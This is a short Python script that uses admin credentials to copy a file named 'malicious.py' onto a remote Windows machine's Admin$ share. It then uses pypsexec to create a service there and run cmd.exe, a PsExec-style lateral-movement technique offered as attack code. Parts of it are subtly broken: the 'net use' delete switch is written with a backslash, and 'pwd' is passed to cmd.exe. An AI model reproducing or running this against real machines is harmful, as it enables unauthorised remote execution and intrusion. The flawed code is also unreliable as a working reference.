import os
import winreg  # Unsed import?  # noqa: F401
import shutil
from pypsexec.client import Client


def accessAdminShare(computer_name, user_name, executable):
    remote = rf"\\{computer_name}\Admin$"
    local = "Z:"
    remote_file = f"{local}\\{executable}"

    os.system(f"net use {local} {remote} /USER:{user_name}")
    shutil.copy(executable, remote_file)
    os.system(f"net use {local} \delete")


timeout = 1


def executeRemoteScript(computer_name, user_name, password, exe, args):
    client = Client(computer_name, user_name, password)
    client.connect()
    try:
        client.create_service()
        stdout, _, _ = client.run_executable(
            exe, arguments=args, timeout_seconds=timeout
        )
        print(stdout)
    finally:
        client.remove_service()
        client.disconnect()


computer_name = ""
user_name = ""
password = ""
accessAdminShare(computer_name, user_name, r"malicious.py")
executeRemoteScript(computer_name, user_name, password, "cmd.exe", "pwd")
